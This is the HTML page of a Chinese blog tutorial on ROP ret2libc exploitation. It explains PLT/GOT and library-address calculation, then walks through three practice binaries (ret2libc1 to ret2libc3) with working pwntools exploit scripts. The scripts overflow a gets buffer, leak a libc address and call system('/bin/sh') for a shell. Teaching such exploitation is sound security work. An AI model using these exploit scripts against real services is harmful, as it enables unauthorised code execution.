@@ -1,0 +1,361 @@
+<!DOCTYPE html>
+<html lang=en>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1" />
+    
+    
+        
+          
+              <link rel="shortcut icon" href="/images/favicon.ico">
+          
+        
+        
+          
+            <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+          
+        
+        
+          
+            <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+          
+        
+    
+    <!-- title -->
+    <title>ROP-ret2libc原理及应用</title>
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <link href="https://fonts.googleapis.com/css?family=Noto+Sans+SC&display=swap" rel="stylesheet">
+    <link href="https://cdn.jsdelivr.net/gh/tonsky/FiraCode@2/distr/fira_code.css" rel="stylesheet">
+    <!-- rss -->
+    
+    
+<meta name="generator" content="Hexo 4.2.0"></head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fas fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+         
+          <li><a href="/">Home</a></li>
+         
+          <li><a href="/archives/">Articles</a></li>
+         
+          <li><a href="/categories/">Category</a></li>
+         
+          <li><a href="/tags/">Tag</a></li>
+         
+          <li><a href="/about/">About</a></li>
+         
+          <li><a href="/search/">Search</a></li>
+        
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        <li><a class="icon" href="/2020/03/20/%E5%AE%89%E6%81%92%E6%9D%AF%E4%B8%A8%E6%96%B0%E6%98%A5%E7%A5%88%E7%A6%8F%E8%B5%9B/"><i class="fas fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
+        
+        
+        <li><a class="icon" href="/2020/03/20/Canary%E4%BF%9D%E6%8A%A4%E5%8F%8A%E7%AA%81%E7%A0%B4/"><i class="fas fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" href="#"><i class="fas fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">Previous post</span>
+      <span id="i-next" class="info" style="display:none;">Next post</span>
+      <span id="i-top" class="info" style="display:none;">Back to top</span>
+      <span id="i-share" class="info" style="display:none;">Share post</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" href="https://sns.qzone.qq.com/cgi-bin/qzshare/cgi_qzshare_onekey?url=http://yoursite.com/2020/03/20/ROP-ret2libc%E5%8E%9F%E7%90%86%E5%8F%8A%E5%BA%94%E7%94%A8/&title=ROP-ret2libc原理及应用" target="_blank" rel="noopener"><i class="fab fa-qq " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://service.weibo.com/share/share.php?url=http://yoursite.com/2020/03/20/ROP-ret2libc%E5%8E%9F%E7%90%86%E5%8F%8A%E5%BA%94%E7%94%A8/&title=ROP-ret2libc原理及应用" target="_blank" rel="noopener"><i class="fab fa-weibo " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://twitter.com/share?url=http://yoursite.com/2020/03/20/ROP-ret2libc%E5%8E%9F%E7%90%86%E5%8F%8A%E5%BA%94%E7%94%A8/&text=ROP-ret2libc原理及应用" target="_blank" rel="noopener"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=ROP-ret2libc原理及应用&body=Check out this article: http://yoursite.com/2020/03/20/ROP-ret2libc%E5%8E%9F%E7%90%86%E5%8F%8A%E5%BA%94%E7%94%A8/"><i class="fas fa-envelope " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    <div id="toc">
+      <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#01-前置知识"><span class="toc-number">1.</span> <span class="toc-text">01 前置知识</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#02-Ret2libc原理"><span class="toc-number">2.</span> <span class="toc-text">02 Ret2libc原理</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#03-实例分析"><span class="toc-number">3.</span> <span class="toc-text">03 实例分析</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#3-1-ret2libc1"><span class="toc-number">3.1.</span> <span class="toc-text">3.1 ret2libc1</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#3-2-ret2libc2"><span class="toc-number">3.2.</span> <span class="toc-text">3.2 ret2libc2</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#3-3-ret2libc3"><span class="toc-number">3.3.</span> <span class="toc-text">3.3 ret2libc3</span></a></li></ol></li></ol>
+    </div>
+  </span>
+</div>
+
+    
+    <div class="content index py4">
+        
+        <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle" itemprop="name headline">
+        ROP-ret2libc原理及应用
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span itemprop="name">John Doe</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2020-03-20T01:42:37.000Z" itemprop="datePublished">2020-03-20</time>
+        
+        (Updated: <time datetime="2020-03-20T02:05:07.742Z" itemprop="dateModified">2020-03-20</time>)
+        
+      
+    </div>
+
+
+      
+    <div class="article-category">
+        <i class="fas fa-archive"></i>
+        <a class="category-link" href="/categories/pwn%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/">pwn基础知识</a>
+    </div>
+
+
+      
+    <div class="article-tag">
+        <i class="fas fa-tag"></i>
+        <a class="tag-link" href="/tags/ROP-ret2libc%E5%8E%9F%E7%90%86/" rel="tag">ROP-ret2libc原理</a>, <a class="tag-link" href="/tags/pwn/" rel="tag">pwn</a>
+    </div>
+
+
+    </div>
+  </header>
+  
+
+  <div class="content" itemprop="articleBody">
+    <h3 id="01-前置知识"><a href="#01-前置知识" class="headerlink" title="01 前置知识"></a>01 前置知识</h3><ul>
+<li><p>获取shell的方式</p>
+<ul>
+<li>序源码自带系统命令函数                               -简单溢出</li>
+<li>可以找到system函数的plt的绝对地址               -ret2text</li>
+<li>利用输入函数，将shellcode写入到程序中        -ret2shellcode</li>
+<li>利用ROPGadget配合int 0x80调用execve        -ret2Syscall</li>
+<li>利用Libc获取system函数的相对位置.               -ret2Libc</li>
+</ul>
+</li>
+<li><p>plt/got概念</p>
+<ul>
+<li>plt表:Procedure Linkage Table程序联动表（内部函数表）</li>
+<li>got表:Global Offset Table 全局偏移表（全局函数表）</li>
+<li>下图跳过了_dl_runtime_resolve函数地址重定位的过程，直接展示重定位后的调用。<br>由于Libc的延时绑定机制，只有执行过的函数才会在got表中存下来。</li>
+</ul>
+</li>
+</ul>
+<p><img src="/2020/03/20/ROP-ret2libc%E5%8E%9F%E7%90%86%E5%8F%8A%E5%BA%94%E7%94%A8/image-20200122094522330.png" alt></p>
+<h3 id="02-Ret2libc原理"><a href="#02-Ret2libc原理" class="headerlink" title="02 Ret2libc原理"></a>02 Ret2libc原理</h3><p>Libc就是Linux下的C函数库，<strong>ret2libc</strong> 这种攻击方式主要是针对 <strong>动态链接(Dynamic linking)</strong> 编译的程序，因为正常情况下是无法在程序中找到像 <strong>system() 、execve()</strong> 这种系统级函数(如果程序中直接包含了这种函数就可以直接控制返回地址指向他们，而不用通过这种麻烦的方式)。因为程序是动态链接生成的，所以在程序运行时会调用 <strong>libc.so (程序被装载时，动态链接器会将程序所有所需的动态链接库加载至进程空间，libc.so 就是其中最基本的一个)</strong>，<strong>libc.so</strong> 是    linux 下 C 语言库中的运行库<strong>glibc</strong> 的动态链接版，并且 <strong>libc</strong>.<strong>so</strong> 中包含了大量的可以利用的函数，包括 <strong>system() 、execve()</strong> 等系统级函数，我们可以通过找到这些函数在内存中的地址覆盖掉返回地址来获得当前进程的控制权。通常情况下，我们会选择执行 <strong>system(“/bin/sh”)</strong> 来打开 shell， 如此就只剩下两个问题：</p>
+<blockquote>
+<p>1、找到 system() 函数的地址；</p>
+</blockquote>
+<blockquote>
+<p> 2、在内存中找到 “/bin/sh” 这个字符串的地址。</p>
+</blockquote>
+<ul>
+<li>攻击流程</li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">1、泄露一个ret2libc函数的位置</span><br><span class="line">2、获取libc的版本</span><br><span class="line">3、根据偏移获取shell和sh的位置</span><br><span class="line">4、执行程序获取shell</span><br><span class="line"></span><br><span class="line">libc版本</span><br><span class="line">1、https:&#x2F;&#x2F;libc.blukat.me。  2. LibcSearcher</span><br><span class="line"></span><br><span class="line">1、求libc基地址（函数动态地址-函数偏移量）</span><br><span class="line">2、求其他函数地址（基地址+函数偏移量）</span><br></pre></td></tr></table></figure>
+
+<h3 id="03-实例分析"><a href="#03-实例分析" class="headerlink" title="03 实例分析"></a>03 实例分析</h3><h4 id="3-1-ret2libc1"><a href="#3-1-ret2libc1" class="headerlink" title="3.1 ret2libc1"></a>3.1 ret2libc1</h4><ul>
+<li>伪代码</li>
+</ul>
+<p><img src="/2020/03/20/ROP-ret2libc%E5%8E%9F%E7%90%86%E5%8F%8A%E5%BA%94%E7%94%A8/image-20200122100238760.png" alt></p>
+<p>有一个gets函数会有溢出漏洞，程序开启了NX，说明我们在栈中的数据没有执行权限，我们需要使用ROP方式进行绕过，我们使用gdb的pattern进行测试溢出偏移量是112</p>
+<p>接下里我们要做的是执行系统函数system(“/bin/sh”)，来获取系统的权限</p>
+<p>所以我们可以想象我们的payload是：’a’ * 112 + system_plt + 0x0000000 + bin_sh_addr</p>
+<p>我们需要system的plt地址以及字符串/bin/sh的地址</p>
+<p>通过ida知道system的plt地址</p>
+<p><img src="/2020/03/20/ROP-ret2libc%E5%8E%9F%E7%90%86%E5%8F%8A%E5%BA%94%E7%94%A8/image-20200122100805699.png" alt></p>
+<p>获得/bin/sh的地址：</p>
+<p><img src="/2020/03/20/ROP-ret2libc%E5%8E%9F%E7%90%86%E5%8F%8A%E5%BA%94%E7%94%A8/image-20200122100918061.png" alt></p>
+<p>exp:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">p &#x3D; process(&#39;.&#x2F;ret2libc1&#39;)</span><br><span class="line">system_plt_addr &#x3D; 0x08048460</span><br><span class="line">bin_sh_addr &#x3D; 0x08048720</span><br><span class="line">payload &#x3D; flat([&#39;a&#39; * 112 , system_plt_addr , 0x00000000 , bin_sh_addr])</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+<h4 id="3-2-ret2libc2"><a href="#3-2-ret2libc2" class="headerlink" title="3.2 ret2libc2"></a>3.2 ret2libc2</h4><ul>
+<li>伪代码</li>
+</ul>
+<p><img src="/2020/03/20/ROP-ret2libc%E5%8E%9F%E7%90%86%E5%8F%8A%E5%BA%94%E7%94%A8/image-20200122101325253.png" alt></p>
+<ul>
+<li>解题思路</li>
+</ul>
+<p>这道题和第一个题没有太大区别，唯一的区别在于找不到字符串/bin/sh的地址了。所以我们需要重新构造。</p>
+<p>除了在程序中查找/bin/sh的地址，我们也可以直接让用户输入。所以我们可以构造以下payload</p>
+<p>payload = ‘a’ + get_plt + pop_ebx + bin_sh + system_plt + 0x00000000 + bin_sh</p>
+<p>payload里的pop_ebx还是pop eax都无所谓，但我们使用ROPgadget在搜索的时候只能搜到pop ebx；ret</p>
+<p>buf变量的值是bss段的内容，我们使用vmmap就可以看到有w权限的bss,在最末尾-16来保存我们gets输入的内容。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">p &#x3D; process(&#39;.&#x2F;ret2libc2&#39;)</span><br><span class="line">system_plt &#x3D; 0x08048490</span><br><span class="line">gets_plt &#x3D; 0x08048460</span><br><span class="line">buf &#x3D; 0x0804a0e4 - 16</span><br><span class="line">pop_ebx_addr &#x3D; 0x0804843d</span><br><span class="line">payload &#x3D; flat([&#39;a&#39; * 112,gets_plt,pop_ebx_addr,buf,system_plt,0x00000000,buf])</span><br><span class="line">pause()</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/03/20/ROP-ret2libc%E5%8E%9F%E7%90%86%E5%8F%8A%E5%BA%94%E7%94%A8/image-20200122102521831.png" alt></p>
+<h4 id="3-3-ret2libc3"><a href="#3-3-ret2libc3" class="headerlink" title="3.3 ret2libc3"></a>3.3 ret2libc3</h4><p>发现有gets函数，存在漏洞，使用GDB加载程序:gdb ./ret2libc3</p>
+<p>发现有NX保护，我们使用ROP进行绕过。</p>
+<p>我们可以构造payload = ‘a’ * offset + system_plt+0x00000000 + bin_sh_addr</p>
+<p>发现没有system和/bin/sh，所以我们只能靠自己计算这两个的值了。</p>
+<p>那么我们如何得到 system 函数的地址呢？这里就主要利用了两个知识点</p>
+<ul>
+<li>system 函数属于 libc，而 libc.so 动态链接库中的函数之间相对偏移是固定的。</li>
+<li>即使程序有 ASLR 保护，也只是针对于地址中间位进行随机，最低的 12 位并不会发生改变。而 libc 在 github 上有人进行收集，如下</li>
+<li><a href="https://github.com/niklasb/libc-database" target="_blank" rel="noopener">https://github.com/niklasb/libc-database</a></li>
+</ul>
+<p>所以我们第一个要做的事情就是判断这个ret2libc3程序依赖的哪个libc，思路如下：</p>
+<p>1、泄露一个ret2libc3函数的位置</p>
+<p>2、获取libc的版本</p>
+<p>3、根据偏移获取shell和sh的位置</p>
+<p>4、执行程序获取shell</p>
+<p>我们知道在Linux的程序中使用了延迟绑定机制，也就是说一个函数在没有执行前，你是不知道它的真实地址是什么的。而这个程序中我们能看到的有printf函数、gets函数。我们通过这两个函数来确定libc的版本。代码如下：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">import time</span><br><span class="line">p &#x3D; process(&quot;.&#x2F;ret2libc3&quot;)</span><br><span class="line">elf &#x3D; ELF(&quot;.&#x2F;ret2libc3&quot;)</span><br><span class="line">offset &#x3D; 112</span><br><span class="line">#要泄漏的函数的地址</span><br><span class="line">target_func &#x3D; &#39;puts&#39;</span><br><span class="line">#调用puts函数进行打印</span><br><span class="line">puts_func &#x3D; &#39;puts&#39;</span><br><span class="line">puts_plt &#x3D; elf.plt[puts_func]</span><br><span class="line">target_got &#x3D; elf.got[target_func]</span><br><span class="line">main_addr &#x3D; elf.symbols[&#39;main&#39;]</span><br><span class="line">#调用puts函数，打印泄漏函数的got地址，最后返回main函数，在32位程序中调用函数地址的第一个参数就是返回地址，后面的才是参数</span><br><span class="line">payload &#x3D; offset * &#39;a&#39; + p32(puts_plt) + p32(main_addr) + p32(target_got)</span><br><span class="line">#payload &#x3D; flat([offset * &#39;a&#39;,puts_plt,main_addr,puts_got])</span><br><span class="line">p.sendlineafter(&quot;Can you find it !?&quot;,payload)</span><br><span class="line">print hex(u32(p.recv()[0:4]))</span><br></pre></td></tr></table></figure>
+
+<p>我们看一下结果：确实后12位是不变的，3e0。(一个字符4个字节，3 *4 = 12)</p>
+<p><img src="/2020/03/20/ROP-ret2libc%E5%8E%9F%E7%90%86%E5%8F%8A%E5%BA%94%E7%94%A8/image-20200122103407652.png" alt></p>
+<p>最后exp:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">#!&#x2F;usr&#x2F;bin&#x2F;env python</span><br><span class="line"># -*- coding: UTF-8 -*-</span><br><span class="line">from pwn import *</span><br><span class="line">from LibcSearcher import LibcSearcher</span><br><span class="line">sh &#x3D; process(&#39;.&#x2F;ret2libc3&#39;)</span><br><span class="line">ret2libc3 &#x3D; ELF(&#39;.&#x2F;ret2libc3&#39;)</span><br><span class="line">rop &#x3D; ROP(ret2libc3)</span><br><span class="line">func &#x3D; &#39;puts&#39;</span><br><span class="line">puts_plt &#x3D; ret2libc3.plt[&#39;puts&#39;]</span><br><span class="line">libc_start_main_got &#x3D; ret2libc3.got[func]</span><br><span class="line">main &#x3D; ret2libc3.symbols[&#39;main&#39;]# 获取main函数地址</span><br><span class="line">print &quot;leak libc_start_main_got addr and return to main again&quot;</span><br><span class="line">payload &#x3D; flat([&#39;A&#39; * 112, puts_plt, main, libc_start_main_got])</span><br><span class="line">sh.sendlineafter(&#39;Can you find it !?&#39;, payload)</span><br><span class="line">print &quot;get the related addr&quot;</span><br><span class="line">#获取puts函数运行时的地址</span><br><span class="line">libc_start_main_addr &#x3D; u32(sh.recv()[0:4])</span><br><span class="line">print libc_start_main_addr</span><br><span class="line"># 实例化LibcSearcher对象</span><br><span class="line">libc &#x3D; LibcSearcher(func, libc_start_main_addr)</span><br><span class="line"># 计算libc的初始地址（puts的动态地址-puts的偏移地址）</span><br><span class="line">libcbase &#x3D; libc_start_main_addr - libc.dump(func)</span><br><span class="line"># 计算system地址</span><br><span class="line">system_addr &#x3D; libcbase + libc.dump(&#39;system&#39;)</span><br><span class="line"># 计算&#x2F;bin&#x2F;sh地址</span><br><span class="line">binsh_addr &#x3D; libcbase + libc.dump(&#39;str_bin_sh&#39;)</span><br><span class="line">print &quot;get shell&quot;</span><br><span class="line">payload &#x3D; flat([&#39;A&#39; * 104, system_addr, 0xdeadbeef, binsh_addr])</span><br><span class="line">sh.sendline(payload)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>
+
+
+  </div>
+</article>
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+         
+          <li><a href="/">Home</a></li>
+         
+          <li><a href="/archives/">Articles</a></li>
+         
+          <li><a href="/categories/">Category</a></li>
+         
+          <li><a href="/tags/">Tag</a></li>
+         
+          <li><a href="/about/">About</a></li>
+         
+          <li><a href="/search/">Search</a></li>
+        
+      </ul>
+    </div>
+
+    <div id="toc-footer" style="display: none">
+      <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#01-前置知识"><span class="toc-number">1.</span> <span class="toc-text">01 前置知识</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#02-Ret2libc原理"><span class="toc-number">2.</span> <span class="toc-text">02 Ret2libc原理</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#03-实例分析"><span class="toc-number">3.</span> <span class="toc-text">03 实例分析</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#3-1-ret2libc1"><span class="toc-number">3.1.</span> <span class="toc-text">3.1 ret2libc1</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#3-2-ret2libc2"><span class="toc-number">3.2.</span> <span class="toc-text">3.2 ret2libc2</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#3-3-ret2libc3"><span class="toc-number">3.3.</span> <span class="toc-text">3.3 ret2libc3</span></a></li></ol></li></ol>
+    </div>
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" href="https://sns.qzone.qq.com/cgi-bin/qzshare/cgi_qzshare_onekey?url=http://yoursite.com/2020/03/20/ROP-ret2libc%E5%8E%9F%E7%90%86%E5%8F%8A%E5%BA%94%E7%94%A8/&title=ROP-ret2libc原理及应用" target="_blank" rel="noopener"><i class="fab fa-qq fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://service.weibo.com/share/share.php?url=http://yoursite.com/2020/03/20/ROP-ret2libc%E5%8E%9F%E7%90%86%E5%8F%8A%E5%BA%94%E7%94%A8/&title=ROP-ret2libc原理及应用" target="_blank" rel="noopener"><i class="fab fa-weibo fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://twitter.com/share?url=http://yoursite.com/2020/03/20/ROP-ret2libc%E5%8E%9F%E7%90%86%E5%8F%8A%E5%BA%94%E7%94%A8/&text=ROP-ret2libc原理及应用" target="_blank" rel="noopener"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=ROP-ret2libc原理及应用&body=Check out this article: http://yoursite.com/2020/03/20/ROP-ret2libc%E5%8E%9F%E7%90%86%E5%8F%8A%E5%BA%94%E7%94%A8/"><i class="fas fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fas fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
+        <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fas fa-list fa-lg" aria-hidden="true"></i> TOC</a>
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fas fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy; 2020 John Doe 
+    <a href="http://www.beian.miit.gov.cn/" target="_blank">湘ICP备17005082号</a>
+    
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+         
+          <li><a href="/">Home</a></li>
+         
+          <li><a href="/archives/">Articles</a></li>
+         
+          <li><a href="/categories/">Category</a></li>
+         
+          <li><a href="/tags/">Tag</a></li>
+         
+          <li><a href="/about/">About</a></li>
+         
+          <li><a href="/search/">Search</a></li>
+        
+      </ul>
+    </nav>
+  </div>
+  
+  <div class="footer-custom">
+    Framework by <a href="https://hexo.io" target="_blank">Hexo</a> & Theme by <a href="https://github.com/xuthus5/hexo-theme-cactus" target="_blank">Cactus-CN</a> & CDN provided by
+     
+      <a href="https://www.upyun.com/?utm_source=lianmeng&utm_medium=referral" target="_blank">
+        <img class="img-response" src="/images/upyun.png" alt="cdn image">
+      </a>
+    
+  </div>
+</footer>
+
+    </div>
+    <!-- styles -->
+
+<link rel="stylesheet" href="https://cdn.staticfile.org/font-awesome/5.12.1/css/all.min.css">
+
+
+<link rel="stylesheet" href="https://cdn.staticfile.org/justifiedGallery/3.7.0/css/justifiedGallery.min.css">
+
+
+    <!-- jquery -->
+
+<script src="https://cdn.staticfile.org/jquery/3.4.1/jquery.min.js"></script>
+
+
+<script src="https://cdn.staticfile.org/justifiedGallery/3.7.0/js/jquery.justifiedGallery.min.js"></script>
+
+<!-- clipboard -->
+
+  
+<script src="https://cdn.staticfile.org/clipboard.js/2.0.6/clipboard.min.js"></script>
+
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
+    btn += '<i class="far fa-clone"></i>';
+    btn += '</span>'; 
+    // mount it!
+    $(".highlight .code pre").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      target: function(trigger) {
+        return trigger.nextElementSibling;
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "Copied!");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+</body>
+</html>
